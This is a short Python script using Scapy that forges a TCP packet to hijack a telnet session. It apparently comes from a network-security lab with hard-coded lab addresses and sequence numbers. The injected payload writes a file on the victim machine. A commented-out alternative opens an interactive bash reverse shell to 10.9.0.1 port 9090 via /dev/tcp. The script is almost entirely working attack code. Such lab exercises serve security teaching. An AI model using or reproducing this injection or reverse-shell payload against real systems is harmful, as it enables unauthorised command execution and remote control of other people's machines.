#!/usr/bin/env python3
from scapy.all import *

ip = IP(src='10.9.0.6', dst='10.9.0.5')
tcp = TCP(sport=53160, dport=23, flags="A", seq=2846748869, ack=1816317150)
data = "echo 'Ataque com sucesso!' > ataque.txt\r"
# data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data

ls(pkt)
send(pkt, verbose=0)
